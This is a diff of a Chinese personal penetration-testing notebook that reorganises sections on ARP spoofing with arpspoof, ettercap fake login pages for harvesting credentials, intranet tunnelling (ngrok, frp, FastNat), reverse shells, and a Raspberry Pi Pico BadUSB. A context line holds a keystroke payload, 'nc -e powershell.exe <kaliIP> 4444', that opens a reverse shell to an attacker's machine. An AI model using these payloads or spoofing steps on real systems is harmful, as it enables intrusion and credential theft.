@@ -345,7 +345,7 @@ ettercap -G
 arpspoof -i eth0(网卡名) -t 靶机ip 网关
 ```
 
-## （2）ettercap-DNS劫持到伪造网页获取用户名、密码
+## （2）ettercap-伪造网页获取用户名、密码
 
 **靶机的浏览器需要没有dns缓存，才有效。**
 
@@ -798,7 +798,11 @@ https://blog.csdn.net/hktkfly6/article/details/123302335
 
 国内免费代理IP：https://zhuanlan.zhihu.com/p/395461277
 
-# 17. ngrok内网穿透
+# 17. 内网穿透
+
+---
+
+## （1）ngrok
 
 ngrok.com注册不了。替代：ngrok.cc。
 
@@ -810,13 +814,36 @@ ngrok.com注册不了。替代：ngrok.cc。
 
 在官网ngrok.org无法注册。
 
-# 18. frp内网穿透
+## （2） frp
 
 需要一个有公网IP的服务器作为中转。
 
 搭建方法看blog。
 
-# 19. 树莓派pico制作bad usb
+## （3）迅捷
+
+https://www.fastnat.club/index.html#client
+
+https://www.cnblogs.com/devilmaycry812839668/p/17904614.html
+
+* 在内网主机上下载客户端
+
+* 在设备管理页面，输入内网主机的key。
+
+* 添加映射。选择协议类型，本地端口，对外端口
+
+* 在外网通过
+
+  ```text
+  fastnet.club:对外端口
+  就相当于访问内网主机的127.0.0.1:本地端口
+  ```
+
+  
+
+# 18. 树莓派pico制作bad usb
+
+---
 
 获取Windows的powershell管理员权限。
 
@@ -856,7 +883,21 @@ STRING nc -e powershell.exe <kaliIP> 4444<port>
 ENTER
 ```
 
+# 19. 反弹shell
+
+---
+
+也称为反代shell。
+
+被攻击的计算机（被控端）主动连接到攻击者的机器（控制端）获取shell。
+
+**研究下原理和怎么用Python写。**
+
+
+
 # 20. MAC地址隐藏
+
+---
 
 **macchanger工具**
 
@@ -922,21 +963,11 @@ while True:
     time.sleep(1)
 ```
 
----
-
-# 20. 反弹shell
-
-也称为反代shell。
-
-被攻击的计算机（被控端）主动连接到攻击者的机器（控制端）获取shell。
-
-**研究下原理和怎么用Python写。**
-
-
-
----
-
 # 21. nmap
+
+---
+
+# 
 
 
 
